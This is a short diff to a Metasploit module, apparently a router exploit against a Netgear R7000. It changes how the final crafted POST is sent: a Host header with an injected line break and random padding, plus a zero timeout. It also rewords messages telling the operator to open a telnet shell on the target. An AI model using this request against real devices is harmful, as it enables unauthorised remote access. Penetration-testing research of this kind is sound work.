@@ -311,8 +311,7 @@ class MetasploitModule < Msf::Auxiliary
     send_data = post_data.to_s
     send_data.sub!(/\r\n--#{post_data.bound}--\r\n/, '')
 
-    print_status('Sending 10th and final packet. The exploit should hang at this point.')
-    print_status("Connect to the telnet shell by running: telnet #{datastore['RHOST']}")
+    print_status('Sending 10th and final packet...')
 
     res = send_request_cgi({
       'method' => 'POST',
@@ -321,13 +320,9 @@ class MetasploitModule < Msf::Auxiliary
       'agent' => nil, # Disable sending the User-Agent header
       'headers' => { 'Host' => "#{datastore['RHOST']}:#{datastore['RPORT']}\r\n#{Rex::Text.rand_text_alpha(512)}: #{Rex::Text.rand_text_alpha(9)}" },
       'data' => send_data
-    })
+    }, 0)
 
-    if !res.nil?
-      fail_with(Failure::UnexpectedReply, 'The target R7000 router responded on the tenth packet!')
-    end
-
-    print_good('Exploit complete, connect to your shell!')
+    print_status("If the exploit succeeds, you should be able to connect to the telnet shell by running: telnet #{datastore['RHOST']}")
   end
 
   def run
